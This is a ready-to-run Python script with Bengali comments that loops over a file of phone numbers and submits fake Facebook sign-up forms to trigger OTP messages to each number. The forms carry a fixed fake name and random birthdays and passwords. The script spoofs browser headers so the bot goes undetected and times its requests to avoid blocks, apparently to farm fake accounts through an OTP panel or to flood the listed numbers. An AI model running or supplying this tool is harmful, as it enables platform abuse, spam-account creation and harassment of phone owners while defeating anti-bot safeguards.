import requests
import time
import os
import random

# --- Configuration ---
INPUT_FILE = "numbers.txt"
DELAY = 25  # Block এড়াতে ২৫ সেকেন্ড বিরতি জরুরি

def trigger_otp(phone):
    print(f"\n[*] Sending OTP request to: {phone}")
    
    url = "https://m.facebook.com/reg/submit/"
    
    # ব্রাউজারের মতো হেডার যাতে ফেসবুক বট ধরতে না পারে
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://m.facebook.com',
        'Referer': 'https://m.facebook.com/reg/',
        'Connection': 'keep-alive',
    }

    # রেজিস্ট্রেশন ডাটা (সরাসরি ফর্ম সাবমিশন)
    payload = {
        'firstname': 'Rahim',
        'lastname': 'Khan',
        'reg_email__': phone,
        'sex': '2', # Male
        'birthday_day': str(random.randint(1, 28)),
        'birthday_month': str(random.randint(1, 12)),
        'birthday_year': str(random.randint(1990, 2005)),
        'reg_passwd__': 'Pass' + str(random.randint(1000, 9999)),
        'submit': 'Sign Up'
    }

    try:
        # সেশন ব্যবহার করে আসল ব্রাউজারের মতো রিকোয়েস্ট পাঠানো
        with requests.Session() as session:
            response = session.post(url, data=payload, headers=headers, timeout=15)
            
            # ফেসবুক যদি ওটিপি পেজে রিডাইরেক্ট করে বা সাকসেস দেখায়
            if response.status_code == 200:
                print(f"[+] Success: Request delivered to {phone}")
                print("[!] Check your OTP panel now.")
            else:
                print(f"[-] Failed: Server error ({response.status_code})")
                
    except Exception as e:
        print(f"[-] Network Error: {e}")

def main():
    if not os.path.exists(INPUT_FILE):
        print(f"[-] Error: {INPUT_FILE} file not found!")
        return

    with open(INPUT_FILE, "r") as f:
        numbers = [line.strip() for line in f if line.strip()]

    if not numbers:
        print("[-] No numbers found in file.")
        return

    print(f"[*] Total {len(numbers)} numbers found. Process starting...")
    print("-" * 35)

    for num in numbers:
        trigger_otp(num)
        # পরবর্তী নাম্বারের জন্য বিরতি
        print(f"[*] Waiting {DELAY} seconds to prevent block...")
        time.sleep(DELAY)

    print("-" * 35)
    print("[★] Task finished.")

if __name__ == "__main__":
    main()
